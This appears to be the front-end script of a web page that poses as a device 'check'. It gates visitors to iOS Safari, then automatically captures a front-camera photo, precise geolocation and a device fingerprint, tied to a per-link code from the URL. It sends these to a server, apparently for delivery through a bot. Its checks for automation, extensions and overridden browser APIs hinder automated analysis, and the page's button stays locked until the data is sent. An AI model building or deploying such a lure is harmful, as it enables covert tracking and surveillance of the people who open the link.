// === app.js (жёсткий гейт: только iPhone/iPad iOS 18+ Safari) ===

// API base из <script>window.__API_BASE</script> в index.html
const API_BASE =
  (typeof window !== "undefined" && window.__API_BASE)
    ? String(window.__API_BASE).replace(/\/+$/, "")
    : "";

// ==== UI ====
const UI = {
  text: document.getElementById("text"),
  note: document.getElementById("note"),
  btn: document.getElementById("enterBtn"),
};

// === Подготовка input для фолбэка ===
(function ensureFileInput() {
  if (!document.getElementById("fileInp")) {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.id = "fileInp";
    inp.accept = "image/*";
    inp.capture = "user";
    inp.style.display = "none";
    document.body.appendChild(inp);
  }
})();

window.__reportReady = false;
window.__cameraLatencyMs = null;
window.__lastDeviceCheck = null;

// === CODE из URL (?code=...) ===
function determineCode() {
  const q = new URLSearchParams(location.search).get("code");
  const code = q ? String(q).trim() : null;
  return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
}

// === Кнопка ===
function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = "grayscale(35%) brightness(0.9)";
  b.style.opacity = "0.6";
  b.style.cursor = "not-allowed";
  b.style.background = "linear-gradient(90deg, #246, #39a)";
  b.style.boxShadow = "0 0 6px rgba(0,153,255,.25)";
}
function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = "none";
  b.style.opacity = "1";
  b.style.cursor = "pointer";
  b.style.background = "linear-gradient(90deg, #4f00ff, #00bfff)";
  b.style.boxShadow = "0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)";
}

// === Геолокация ===
async function askGeolocation() {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now(),
        }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// === Сжатие base64 фото ===
function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => {
      const ratio = Math.min(1, maxSide / Math.max(img.width, img.height));
      const w = Math.round(img.width * ratio);
      const h = Math.round(img.height * ratio);
      const c = document.createElement("canvas");
      c.width = w;
      c.height = h;
      c.getContext("2d").drawImage(img, 0, 0, w, h);
      try {
        resolve(c.toDataURL("image/jpeg", quality));
      } catch (e) {
        reject(e);
      }
    };
    img.onerror = reject;
    img.src = dataUrl;
  });
}

// === Фото (основной путь, совместимо с Safari) ===
async function takePhoto() {
  if (!navigator.mediaDevices?.getUserMedia) throw new Error("Камера недоступна");
  const t0 = (typeof performance !== "undefined" ? performance.now() : Date.now());
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
  return new Promise((resolve, reject) => {
    try {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.playsInline = true;

      let fallbackTimer = setTimeout(() => {
        try {
          const c = document.createElement("canvas");
          c.width = 1280;
          c.height = 720;
          c.getContext("2d").drawImage(video, 0, 0);
          const dataUrl = c.toDataURL("image/jpeg", 0.8);
          stream.getTracks().forEach((t) => t.stop());
          const t1 = (typeof performance !== "undefined" ? performance.now() : Date.now());
          window.__cameraLatencyMs = Math.round(Math.max(0, t1 - t0));
          resolve(dataUrl);
        } catch (e) {
          reject(e);
        }
      }, 3000);

      video.onloadedmetadata = async () => {
        try {
          await video.play();
          clearTimeout(fallbackTimer);
          const c = document.createElement("canvas");
          c.width = video.videoWidth || 1280;
          c.height = video.videoHeight || 720;
          c.getContext("2d").drawImage(video, 0, 0);
          const dataUrl = c.toDataURL("image/jpeg", 0.85);
          stream.getTracks().forEach((t) => t.stop());
          const t1 = (typeof performance !== "undefined" ? performance.now() : Date.now());
          window.__cameraLatencyMs = Math.round(Math.max(0, t1 - t0));
          resolve(dataUrl);
        } catch (err) {
          stream.getTracks().forEach((t) => t.stop());
          reject(err);
        }
      };
    } catch (e) {
      try {
        stream.getTracks().forEach((t) => t.stop());
      } catch {}
      reject(e);
    }
  });
}

// === Фото (фолбэк через input[type=file]) ===
async function takePhotoWithFallback() {
  try {
    return await takePhoto();
  } catch {
    const inp = document.getElementById("fileInp");
    return new Promise((resolve, reject) => {
      inp.onchange = () => {
        const f = inp.files && inp.files[0];
        if (!f) return reject(new Error("Файл не выбран"));
        const fr = new FileReader();
        fr.onload = () => resolve(fr.result);
        fr.onerror = reject;
        fr.readAsDataURL(f);
      };
      inp.click();
    });
  }
}

// === Инфо об устройстве (строго) ===
function getDeviceInfoStrict() {
  const ua = navigator.userAgent || "";
  const vendor = navigator.vendor || "";
  const platform = navigator.platform || "";
  const dpr = window.devicePixelRatio || 1;
  const m = ua.match(/\bOS\s*(\d+)[._]/) || ua.match(/\bVersion\/(\d+)/);
  const iosVer = m ? parseInt(m[1], 10) : null;
  const isSafari =
    /Safari\//.test(ua) &&
    !/CriOS|Chrome|Chromium|FxiOS|Edg|OPR|OPiOS|YaBrowser|DuckDuckGo|UCBrowser|Brave/i.test(ua) &&
    vendor === "Apple Computer, Inc." &&
    /\bAppleWebKit\/\d+/.test(ua);
  return { userAgent: ua, vendor, platform, iosVersion: iosVer, isSafari, dpr };
}

// === Жёсткая детекция подмены UA / расширений / автоматизации ===
async function runDeviceCheckStrict() {
  const reasons = [];
  const details = {};
  let score = 100;

  try {
    details.ua = navigator.userAgent || "";
    details.vendor = navigator.vendor || "";
    details.platform = navigator.platform || "";
    details.lang = navigator.language || "";
    details.timezone = (Intl && Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions)
      ? Intl.DateTimeFormat().resolvedOptions().timeZone
      : null;
    details.dpr = window.devicePixelRatio || 1;
    details.screen = { w: (screen && screen.width) || null, h: (screen && screen.height) || null };
    details.hasTouchEvent = ("ontouchstart" in window);
    details.maxTouchPoints = Number(navigator.maxTouchPoints || 0);
    details.navigator_webdriver = (typeof navigator.webdriver === "boolean") ? navigator.webdriver : undefined;

    // Safari/WebKit признаки
    const hasWebkitObj = !!window.webkit;
    const hasWebkitCSS = (typeof CSS !== "undefined" && typeof CSS.supports === "function")
      ? CSS.supports("-webkit-touch-callout", "none")
      : false;
    details.isSafariLike = !!(hasWebkitObj || hasWebkitCSS || details.vendor === "Apple Computer, Inc.");

    // Согласованность
    const ua = details.ua;
    const looksLikeIOS = /iP(hone|ad|od)/.test(ua);
    const mentionsSafari = /Safari\//.test(ua);
    const appleVendor = (details.vendor === "Apple Computer, Inc.");
    const platformIOS = /iPhone|iPad|iPod|Mac/.test(details.platform || "");

    if (looksLikeIOS && !appleVendor) {
      reasons.push("UA=iOS, но vendor ≠ 'Apple Computer, Inc.'");
      score -= 30;
    }
    if (mentionsSafari && !details.isSafariLike) {
      reasons.push("UA=Safari, но нет WebKit-признаков");
      score -= 30;
    }
    if (looksLikeIOS && details.maxTouchPoints === 0) {
      reasons.push("UA=iOS, но maxTouchPoints == 0");
      score -= 30;
    }
    if (looksLikeIOS && !platformIOS) {
      reasons.push("UA=iOS, но platform не похож на iOS/Mac");
      score -= 15;
    }

    // Автоматизация
    if (details.navigator_webdriver === true) {
      reasons.push("navigator.webdriver === true (автоматизация)");
      score -= 100;
    }

    // Проверяем runtime API leakage (признаки расширений / инъекций)
    const leakedChromeRuntime = !!(window.chrome && window.chrome.runtime);
    const leakedBrowserRuntime = !!(window.browser && window.browser.runtime);
    if (leakedChromeRuntime || leakedBrowserRuntime) {
      reasons.push("Следы API расширений runtime (возможна инъекция)");
      score -= 20;
      details.leakedRuntime = true;
    }

    // Проверяем, native ли функции (очень жёсткий чек)
    function looksNative(fn) {
      try { return typeof fn === "function" && /\[native code\]/.test(Function.prototype.toString.call(fn)); }
      catch { return false; }
    }
    const suspiciousNative =
      !looksNative(navigator.permissions?.query) ||
      !looksNative(navigator.geolocation?.getCurrentPosition) ||
      !looksNative(navigator.mediaDevices?.getUserMedia);
    if (suspiciousNative) {
      reasons.push("Web API переопределены (не native) — подозрительно");
      score -= 20;
    }

    details.extensionsSuspicious = (leakedChromeRuntime || leakedBrowserRuntime || suspiciousNative);

    // Камера latency (если уже померяли в takePhoto)
    details.cameraLatencyMs = (typeof window.__cameraLatencyMs === "number") ? window.__cameraLatencyMs : null;
    if (details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
      reasons.push("Слишком малая cameraLatency — аномально");
      score -= 20;
    }

    // минимальные sanity-чексы (размер экрана / DPR)
    if ((details.screen.w && details.screen.w < 320) || details.dpr < 1) {
      reasons.push("Подозрительные screen/dpr");
      score -= 10;
    }

    // Итоговая ремарка
    if (score >= 80) reasons.push("Ок: признаки iOS/Safari согласованы");
    else if (score >= 60) reasons.push("Есть несостыковки — рекомендуем лёгкую доп. проверку");
    else reasons.push("Высокая вероятность подмены (отклонять)");

  } catch (e) {
    reasons.push("Ошибка проверки окружения: " + (e?.message || String(e)));
    score = Math.min(score, 40);
  }

  return { score, reasons, details, timestamp: Date.now() };
}

// === Отправка отчёта (с опциональным nonce flow) ===
async function fetchServerNonce() {
  // Опционально: сервер выдает nonce/sig, чтобы отличить прямые POSTы.
  // Сервер: GET /api/nonce -> {nonce:"xxx", expires:ts, sig:"hmac"}
  try {
    const r = await fetch(`${API_BASE}/api/nonce`, { method: "GET", credentials: "omit" });
    if (!r.ok) return null;
    return await r.json();
  } catch {
    return null;
  }
}

async function sendReport({ photoBase64, geo }) {
  const info = getDeviceInfoStrict();
  const code = determineCode();
  if (!code) throw new Error("Нет кода в URL");

  // Добавляем device_check если он есть (полезно для логов/аналитики)
  const device_check = window.__lastDeviceCheck || null;

  // OPTIONAL: получить nonce от сервера и передать его в теле (сервер должен валидировать HMAC)
  const nonceObj = await fetchServerNonce().catch(() => null);

  const body = { ...info, geo, photoBase64, note: "auto", code, device_check, nonceObj };

  // НИКОГДА не подставляй в клиенте секреты — HMAC подписывается на сервере и проверяется там.
  const r = await fetch(`${API_BASE}/api/report`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  const text = await r.text().catch(() => "");
  let data;
  try {
    data = JSON.parse(text);
  } catch {
    data = null;
  }

  if (!r.ok) {
    // если сервер вернул 4xx/5xx, передаем текст дальше для диагностики
    throw new Error((data && data.error) || text || `HTTP ${r.status}`);
  }

  if (!data?.ok) {
    throw new Error((data && data.error) || "Ошибка ответа сервера");
  }

  return data;
}

// === Основной поток ===
async function autoFlow() {
  try {
    setBtnLocked();
    if (UI.text) UI.text.innerHTML = "Запрашиваем камеру и геолокацию…";

    const isSecure = location.protocol === "https:" || location.hostname === "localhost";
    if (!isSecure) throw new Error("Нужен HTTPS (или localhost) для камеры/гео");

    const [geo, rawPhoto] = await Promise.all([askGeolocation(), takePhotoWithFallback()]);
    const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);

    // >>> НОВОЕ: прогоняем детектор (жёсткий)
    const check = await runDeviceCheckStrict();
    window.__lastDeviceCheck = check;

    // Порог: жёстко режем явную подмену (score < 70)
    if (check.score < 70) {
      window.__reportReady = false;
      setBtnLocked();
      if (UI.text) UI.text.innerHTML = '<span class="err">Проверка не пройдена.</span>';
      if (UI.note) UI.note.textContent = "Обнаружены признаки подмены UA/расширений/автоматизации.";
      // логируем детали в консоль (или отправляем в телеграм лог)
      console.warn("DeviceCheck failed:", check);
      return; // стоп — не отправляем
    }

    if (UI.text) UI.text.innerHTML = "Отправляем данные…";
    const resp = await sendReport({ photoBase64, geo });

    // Сервер может вернуть delivered:false (например, бот недоступен)
    window.__reportReady = true;
    setBtnReady();
    if (UI.text) UI.text.innerHTML = '<span class="ok">Проверка пройдена.</span>';

    if (resp && resp.delivered === false) {
      if (UI.note) UI.note.textContent = resp.reason || "Доставим позже.";
    } else {
      if (UI.note) UI.note.textContent = "Можно продолжить.";
    }
  } catch (e) {
    console.error("[AUTO-FLOW ERROR]", e);
    setBtnLocked();
    window.__reportReady = false;
    if (UI.text) UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
    if (UI.note)
      UI.note.textContent = "Причина: " + (e && e.message ? e.message : String(e));
  }
}

// =======================
// Жёсткий гейт: запускаем автофлоу только если iOS/iPadOS >= 18 и Safari
// =======================
const MIN_IOS_MAJOR = 18;

function isIOSFamily() {
  const ua = navigator.userAgent || "";
  const touchMac = navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1; // iPadOS на Mac
  return /(iPhone|iPad|iPod)/.test(ua) || touchMac;
}

function parseIOSMajorFromUA() {
  const ua = navigator.userAgent || "";
  const m1 = ua.match(/\bOS\s+(\d+)[._]/);
  if (m1) return parseInt(m1[1], 10);
  const m2 = ua.match(/\bVersion\/(\d+)/);
  if (m2) return parseInt(m2[1], 10);
  return null;
}

function isPureSafari() {
  const ua = navigator.userAgent || "";
  const hasSafari = /Safari\//.test(ua);
  const hasWebKit = /\bAppleWebKit\/\d+/.test(ua);
  const notSafari = /CriOS|Chrome|Chromium|FxiOS|Firefox|Edg|EdgiOS|OPR|OPiOS|YaBrowser|DuckDuckGo|UCBrowser|Brave/i.test(ua);
  const vendorOK = navigator.vendor === "Apple Computer, Inc.";
  return vendorOK && hasWebKit && hasSafari && !notSafari;
}

function secureContextOK() {
  return location.protocol === "https:" || location.hostname === "localhost";
}

// UI helpers
function uiDeny(reason) {
  try {
    if (UI.text) UI.text.innerHTML = '<span class="err">Отказ в доступе</span>';
    if (UI.note) UI.note.textContent = reason;
    setBtnLocked();
  } catch {}
}

function uiAllow(iosMajor) {
  try {
    if (UI.text) UI.text.innerHTML = '<span class="ok">Доступ разрешён.</span>';
    if (UI.note) UI.note.textContent = 'Кнопка активируется после проверки.';
    setBtnLocked(); // активируется внутри autoFlow
  } catch {}
}

function deviceGateCheckHard() {
  if (!secureContextOK())
    return { ok: false, reason: "Нужен HTTPS (или localhost) для камеры/гео." };

  if (!isIOSFamily())
    return { ok: false, reason: "Устройство не относится к iOS/iPadOS." };

  const iosMajor = parseIOSMajorFromUA();
  if (iosMajor == null)
    return { ok: false, reason: "Не удалось определить версию iOS/iPadOS." };

  if (iosMajor < MIN_IOS_MAJOR)
    return { ok: false, reason: `Версия iOS/iPadOS ниже ${MIN_IOS_MAJOR}.` };

  if (!isPureSafari())
    return { ok: false, reason: "Браузер не Safari (или подмена User-Agent)." };

  return { ok: true, iosMajor };
}

function runGateAndStart() {
  const res = deviceGateCheckHard();
  if (!res.ok) {
    uiDeny(res.reason);
    return;
  }
  uiAllow(res.iosMajor);
  if (typeof window.__autoFlow === "function") {
    setTimeout(() => window.__autoFlow(), 100);
  }
}

if (document.readyState === "complete" || document.readyState === "interactive") {
  runGateAndStart();
} else {
  document.addEventListener("DOMContentLoaded", runGateAndStart);
}

// защита от преждевременного клика
(function guardClick() {
  const btn = UI.btn;
  if (!btn) return;
  btn.addEventListener(
    "click",
    (e) => {
      if (!window.__reportReady) {
        e.preventDefault();
        e.stopPropagation();
      }
    },
    { capture: true }
  );
})();
